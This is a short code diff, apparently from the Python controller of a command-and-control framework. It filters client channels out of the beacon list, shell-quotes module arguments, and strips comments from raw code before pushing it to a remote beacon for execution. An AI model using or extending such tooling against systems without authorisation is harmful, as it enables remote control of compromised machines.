@@ -15,6 +15,7 @@ import importlib
 import json
 import re
 import secrets
+import shlex
 import socket
 import sys
 import threading
@@ -281,7 +282,11 @@ def list_beacons() -> tuple:
         return False, out
     if "(no beacons" in out:
         return True, []
-    return True, _parse_beacons(out)
+    # 远端 `beacon` 命令列出全部连接(含 client 通道);与本地
+    # c2_bridge.list_beacons 口径一致(client 通道以 client_<host>_<ts> 注册),
+    # 这里过滤掉 client 通道条目,只留真 beacon(2026-09-28)
+    return True, [b for b in _parse_beacons(out)
+                  if not str(b.get("client_id") or "").startswith("client_")]
 
 
 def beacon_detail(client_id: str) -> tuple:
@@ -311,12 +316,22 @@ def exec_module(client_id: str, name: str, args: list) -> tuple:
         return False, out
     if not name:
         return False, "未指定模块"
-    line = name if not args else f"{name} {' '.join(args)}"
+    line = name if not args else f"{name} {' '.join(shlex.quote(str(a)) for a in args)}"
     return command(line)
 
 
 def push_raw(client_id: str, code: str) -> tuple:
-    """远端下发原始代码。"""
+    """远端下发原始代码。与本地 c2_bridge.push_raw 对齐:下发前剥离 # 注释。"""
+    code = str(code or "").strip()
+    if not code:
+        return False, "代码为空"
+    try:
+        from server.core.pycode import strip_py_comments
+        code = strip_py_comments(code).strip()
+        if not code:
+            return False, "剥离注释后代码为空"
+    except ImportError:
+        pass
     return command(f"raw {client_id} {code}")
 
 
